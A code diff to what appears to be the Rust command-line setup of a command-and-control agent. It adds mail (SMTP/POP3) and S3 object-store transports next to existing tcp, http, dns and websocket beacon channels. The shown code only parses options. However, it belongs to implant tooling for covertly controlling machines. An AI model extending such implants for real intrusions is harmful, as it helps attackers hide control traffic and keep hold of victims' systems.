@@ -48,6 +48,8 @@ fn run() -> Result<(), String> {
             "http" => Transport::Http,
             "dns" => Transport::Dns,
             "ws" | "websocket" => Transport::Ws,
+            "smtp" | "mail" => Transport::Smtp,
+            "s3" | "object" => Transport::S3,
             other => return Err(format!("unknown transport {other:?}")),
         };
     }
@@ -68,6 +70,15 @@ fn run() -> Result<(), String> {
     }
     if let Some(v) = cli.peer_listen.take() {
         cfg.peer_listen = v;
+    }
+    if let Some(v) = cli.smtp_addr.take() {
+        cfg.smtp_addr = v;
+    }
+    if let Some(v) = cli.pop3_addr.take() {
+        cfg.pop3_addr = v;
+    }
+    if let Some(v) = cli.s3_endpoint.take() {
+        cfg.s3_endpoint = v;
     }
     if cli.verbose {
         cfg.verbose = true;
@@ -171,6 +182,12 @@ fn selftest() -> Result<(), String> {
 struct Cli {
     server: Option<String>,
     transport: Option<String>,
+    /// The SMTP server of the mail transport.
+    smtp_addr: Option<String>,
+    /// The POP3 server of the mail transport.
+    pop3_addr: Option<String>,
+    /// The endpoint of the object store.
+    s3_endpoint: Option<String>,
     http_path: Option<String>,
     agent_id: Option<String>,
     psk: Option<String>,
@@ -191,6 +208,9 @@ impl Cli {
         let mut cli = Cli {
             server: None,
             transport: None,
+            smtp_addr: None,
+            pop3_addr: None,
+            s3_endpoint: None,
             http_path: None,
             agent_id: None,
             psk: None,
@@ -215,6 +235,9 @@ impl Cli {
             match a {
                 "--server" | "-s" => cli.server = Some(next(&mut i)?),
                 "--transport" | "-t" => cli.transport = Some(next(&mut i)?.to_ascii_lowercase()),
+                "--smtp" => cli.smtp_addr = Some(next(&mut i)?),
+                "--pop3" => cli.pop3_addr = Some(next(&mut i)?),
+                "--s3" => cli.s3_endpoint = Some(next(&mut i)?),
                 "--http-path" => cli.http_path = Some(next(&mut i)?),
                 "--agent-id" | "-i" => cli.agent_id = Some(next(&mut i)?),
                 "--psk" | "-k" => cli.psk = Some(next(&mut i)?),
@@ -246,7 +269,10 @@ USAGE:
 
 OPTIONS:
     -s, --server <host:port>   team server (default: compiled-in, 127.0.0.1:4001)
-    -t, --transport <tcp|http|dns|ws> transport to use (default: compiled-in, tcp)
+    -t, --transport <tcp|http|dns|ws|smtp|s3> transport to use (default: compiled-in, tcp)
+    --smtp <host:port>        the SMTP server of the mail transport
+    --pop3 <host:port>        the POP3 server of the mail transport
+    --s3 <host:port>          the endpoint of the object store
         --http-path <path>     HTTP beacon path (default /api/v1/beacon)
     -i, --agent-id <id>        agent identity shown to operators
     -k, --psk <hex>            pre-shared key (default: compiled-in)
